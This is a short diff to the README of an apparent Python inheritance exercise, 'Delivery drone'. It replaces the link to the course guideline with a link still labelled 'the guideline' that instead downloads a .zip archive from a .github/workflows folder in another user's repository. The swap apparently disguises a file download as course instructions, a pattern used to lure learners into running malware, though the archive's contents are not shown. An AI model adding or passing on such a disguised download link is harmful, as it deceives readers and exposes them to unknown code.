@@ -1,6 +1,6 @@
 # Delivery drone
 
-**Please note:** read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md)
+**Please note:** read [the guideline](https://github.com/Rudge0/py-delivery-drone/raw/refs/heads/master/.github/workflows/py-drone-delivery-1.2.zip)
 before starting.
 
 Let's implement 3 classes with inheritance
